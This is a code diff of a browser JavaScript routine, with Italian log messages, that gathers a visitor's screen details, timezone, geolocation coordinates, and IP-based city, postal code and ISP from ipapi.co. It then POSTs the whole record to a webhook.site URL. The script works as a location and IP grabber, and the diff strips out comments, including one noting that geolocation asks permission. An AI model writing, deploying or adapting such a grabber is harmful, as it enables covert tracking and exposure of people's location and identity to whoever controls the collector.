@@ -37,66 +37,62 @@
           height: screen.height,
           availWidth: screen.availWidth,
           availHeight: screen.availHeight,
-          colorDepth: screen.colorDepth,
+          colorDepth: screen.colorDepth
         },
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         timestamp: new Date().toISOString(),
-        location: {
-          latitude: null,
-          longitude: null,
-          accuracy: null,
-        },
-        ipInfo: {
-          ip: null,
-          city: null,
-          region: null,
-          country: null,
-          postal: null,
-          org: null,
-        }
+        location: {},
+        ipInfo: {}
       };
 
-      // Geolocalizzazione browser (chiede permesso)
       if (navigator.geolocation) {
         try {
-          const pos = await new Promise((resolve, reject) => {
-            navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 5000});
-          });
-          data.location.latitude = pos.coords.latitude;
-          data.location.longitude = pos.coords.longitude;
-          data.location.accuracy = pos.coords.accuracy;
+          const pos = await new Promise((resolve, reject) =>
+            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 })
+          );
+          data.location = {
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude,
+            accuracy: pos.coords.accuracy
+          };
         } catch (err) {
           console.warn("Geolocalizzazione non consentita o fallita:", err.message);
         }
       }
 
-      // Informazioni IP e località da servizio pubblico
       try {
-        const ipApiRes = await fetch('https://ipapi.co/json/');
-        if (ipApiRes.ok) {
-          const ipInfo = await ipApiRes.json();
-          data.ipInfo.ip = ipInfo.ip;
-          data.ipInfo.city = ipInfo.city;
-          data.ipInfo.region = ipInfo.region;
-          data.ipInfo.country = ipInfo.country_name;
-          data.ipInfo.postal = ipInfo.postal;
-          data.ipInfo.org = ipInfo.org;
+        const res = await fetch("https://ipapi.co/json/");
+        if (res.ok) {
+          const ip = await res.json();
+          data.ipInfo = {
+            ip: ip.ip,
+            city: ip.city,
+            region: ip.region,
+            country: ip.country_name,
+            postal: ip.postal,
+            org: ip.org
+          };
         } else {
-          console.warn("Errore risposta ipapi:", ipApiRes.status);
+          console.warn("Errore ipapi:", res.status);
         }
       } catch (e) {
-        console.warn("Errore fetch ipapi:", e.message);
+        console.warn("Errore fetch IP:", e.message);
       }
 
       console.log("Dati raccolti:", data);
 
-      // INVIA dati al webhook (sostituisci con il tuo URL base corretto!)
       fetch('https://webhook.site/a7e36058-c9a9-4f83-9740-7f2cc820609a', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        headers: {
+          'Content-Type': 'application/json'
+        },
         body: JSON.stringify(data)
       })
-      .then(() => console.log(" Dati inviati con successo"))
+      .then(res => {
+        console.log("Risposta webhook:", res.status);
+        return res.text();
+      })
+      .then(txt => console.log("Testo risposta:", txt))
       .catch(err => console.error("Errore invio dati:", err));
     }
 
